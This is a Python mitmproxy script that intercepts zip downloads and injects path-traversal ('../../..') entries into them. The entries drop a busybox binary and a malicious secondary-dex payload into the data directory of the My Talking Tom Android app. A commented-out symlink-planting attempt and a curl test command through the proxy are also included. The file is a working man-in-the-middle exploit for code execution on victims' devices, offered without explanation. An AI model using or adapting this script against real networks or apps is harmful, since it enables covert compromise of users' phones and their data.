import os
from libmproxy import proxy, flow
from netlib import odict
import shutil
import zipfile
import urllib2
import tempfile

#Test
#  curl -x http://localhost:8080 http://cds.g8j8b9g6.hwcdn.net/bundles/51508704e2903eb17f000006-2.zip > tmp.zip

def start(context, argv):
    global payload
    global busybox
    with open('payload.zip', 'r') as f:
      payload = f.read()
    with open('busybox', 'r') as f:
      busybox = f.read()
    context.log("start")

def response(context, flow):
  content_type_headers = flow.response.headers["content-type"]
  if len(content_type_headers) != 1: return
  content_type = content_type_headers[0]
  if (content_type.startswith("application/x-zip-compressed") or content_type.startswith("application/zip") or (content_type.startswith("application/octet-stream")) and flow.response.content[0:2] == "PK"):
    context.log("Found zip")
    with tempfile.SpooledTemporaryFile() as tmp:
      tmp.write(flow.response.content)
      # Reset file pointer
      tmp.seek(0)
      injectIntoZip(tmp, "../../../../../../../../../../../../../../../../../../../../../../data/data/com.outfit7.mytalkingtomfree/files/busybox", busybox)

      tmp.seek(0)
      injectIntoZip(tmp, "../../../../../../../../../../../../../../../../../../../../../../data/data/com.outfit7.mytalkingtomfree/code_cache/secondary-dexes/com.outfit7.mytalkingtomfree-1.apk.classes2.zip", payload)
      tmp.seek(0)
      flow.response.content = tmp.read()

def create_dir_if_not_exists(f):
  if not os.path.exists(f):
    os.makedirs(f)

def injectIntoZip(zipFile, zipEntryName, zipEntryData):
  zf = zipfile.ZipFile(zipFile, "a")
  info = zipfile.ZipInfo(zipEntryName)
  info.external_attr = 660 << 16L #File Permissions
  zf.writestr(info, zipEntryData)

#attempt to write a symlink
#  a  =  zipfile.ZipInfo()
#  a.filename  =  "../../../../../../data/linkHax"
#  a.create_system  =  3
#  a.external_attr  = 0xA1ED0000L
#  zf.writestr(a,  "/data/local/tmp/yoloswag")

  zf.close()

def sha1OfFile(filepath):
    import hashlib
    with open(filepath, 'rb') as f:
        return hashlib.sha1(f.read()).hexdigest()

